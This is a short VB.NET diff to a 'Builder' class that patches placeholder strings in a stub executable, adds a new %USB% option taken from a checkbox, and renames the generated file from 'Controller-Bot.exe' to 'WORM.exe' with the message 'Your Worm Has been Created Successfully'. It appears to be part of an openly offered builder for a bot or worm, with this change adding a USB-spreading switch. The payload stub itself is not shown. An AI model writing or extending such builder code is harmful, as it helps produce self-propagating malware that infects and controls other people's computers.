@@ -65,6 +65,9 @@ Public Class Builder
                                             If (str = "%PATH2%") Then
                                                 current.Operand = PATH2.Text
                                             End If
+                                            If (str = "%USB%") Then
+                                                current.Operand = USB.Checked.ToString
+                                            End If
                                         End If
                                     Loop
                                 Finally
@@ -74,8 +77,8 @@ Public Class Builder
                     Next
                 Next
 
-                definition.Write(Application.StartupPath + "\" + "Controller-Bot.exe")
-                MsgBox("Your Controller Has been Created Successfully", vbInformation, "DONE!")
+                definition.Write(Application.StartupPath + "\" + "WORM.exe")
+                MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                 My.Settings.Save()
                 Me.Close()
             Catch ex1 As Exception
